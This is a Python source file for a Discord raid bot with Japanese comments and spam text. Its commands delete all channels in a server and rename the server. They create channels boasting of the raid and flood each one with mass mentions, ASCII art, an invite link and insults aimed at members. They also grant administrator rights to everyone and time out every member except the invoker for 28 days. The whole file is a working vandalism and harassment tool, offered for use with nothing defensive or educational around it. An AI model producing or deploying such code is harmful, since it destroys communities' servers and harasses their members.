import discord
from discord.ext import commands
import os
import asyncio
import random
from datetime import timedelta

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

SERVER_NAME = "トイ神の植民地"
CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
CHANNEL_COUNT = 15
MESSAGE_LOOPS = 80

COMBINED_TEXT = (
    "@everyone\n"
    ".∧_∧\n"
    " ( ･ω･)つﾞ☆ﾍﾟﾁﾍﾟﾁ\n"
    " と ＿⌒))\n"
    "        (_ﾉﾉ\n"
    "\n"
    "∧,＿,∧  バカが治りますよ～に♡\n"
    "（`・ω・)つ━☆・*.\n"
    "⊂　　 ノ 　　　・゜+.\n"
    "　し'´Ｊ　　*・ °。\n"
    "\n"
    "https://discord.gg/4y3kfgr8p\n"
    "https://discord.gg/4y3kfgr8p\n"
    "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂"
)


def random_mentions(guild: discord.Guild) -> str:
    members = [m for m in guild.members if not m.bot]
    if not members:
        return "@everyone\n"
    k = min(30, len(members))
    picked = random.choices(members, k=k)
    return " ".join(m.mention for m in picked) + "\n"


@bot.command()
async def start(ctx):
    guild = ctx.guild
    try:
        await guild.edit(name=SERVER_NAME)
    except:
        pass

    tasks = []
    for ch in list(guild.channels):
        tasks.append(ch.delete())
    await asyncio.gather(*tasks, return_exceptions=True)

    tasks = []
    for i in range(CHANNEL_COUNT):
        tasks.append(guild.create_text_channel(f"{CHANNEL_NAME}-{i+1}"))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    new_channels = [ch for ch in results if isinstance(ch, discord.TextChannel)]

    for _ in range(MESSAGE_LOOPS):
        text = random_mentions(guild) + COMBINED_TEXT
        tasks = [ch.send(text) for ch in new_channels]
        await asyncio.gather(*tasks, return_exceptions=True)


@bot.command()
async def admin(ctx):
    guild = ctx.guild
    admin_role = discord.utils.get(guild.roles, name="TISN管理者")
    if not admin_role:
        try:
            admin_role = await guild.create_role(
                name="TISN管理者",
                permissions=discord.Permissions(administrator=True)
            )
        except:
            return

    tasks = []
    for m in guild.members:
        if not m.bot and admin_role not in m.roles:
            tasks.append(m.add_roles(admin_role))
    await asyncio.gather(*tasks, return_exceptions=True)


# ==============================================
# ✅ !to に全部まとめた！
# ① 自分に管理者権限付与 → ② Botロールを一番上へ → ③ 全員タイムアウト
# ==============================================
@bot.command(name="to")
async def total_timeout(ctx):
    guild = ctx.guild
    author = ctx.author
    report = []

    # ① 管理者ロールを作成または取得して自分に付与
    admin_role = discord.utils.get(guild.roles, name="TISN管理者")
    if not admin_role:
        try:
            admin_role = await guild.create_role(
                name="TISN管理者",
                permissions=discord.Permissions(administrator=True)
            )
            report.append("✅ 管理者ロールを新規作成")
        except Exception as e:
            report.append(f"❌ 管理者ロール作成失敗: {e}")
            await ctx.send("\n".join(report))
            return

    if admin_role not in author.roles:
        try:
            await author.add_roles(admin_role)
            report.append("✅ あなたに管理者権限を付与")
        except Exception as e:
            report.append(f"❌ ロール付与失敗: {e}")
            await ctx.send("\n".join(report))
            return

    # 権限反映待ち
    await asyncio.sleep(1.5)

    # ② Botのロールを一番上に移動
    bot_top_role = guild.me.top_role
    target_position = len(guild.roles) - 2  # @everyoneのすぐ下
    try:
        await bot_top_role.edit(position=target_position, reason=f"!to by {author}")
        report.append("✅ Botロールを一番上に移動")
    except Exception as e:
        report.append(f"⚠️ Botロール移動失敗（続行します）: {e}")

    # ③ 自分以外全員を28日間タイムアウト
    duration = discord.utils.utcnow() + timedelta(days=28)
    tasks = []
    target_count = 0
    for member in guild.members:
        if member.bot or member.id == author.id:
            continue
        try:
            tasks.append(member.edit(timeout_until=duration, reason="!to による一括タイムアウト"))
            target_count += 1
        except:
            pass

    results = await asyncio.gather(*tasks, return_exceptions=True)
    success_count = sum(1 for r in results if not isinstance(r, Exception))
    report.append(f"✅ タイムアウト実行: {success_count}/{target_count} 人")

    # 最終報告
    await ctx.send("## 🎯 !to 完了\n" + "\n".join(report))


@bot.event
async def on_ready():
    print(f"起動: {bot.user}")


TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("トークンを設定してください")

bot.run(TOKEN)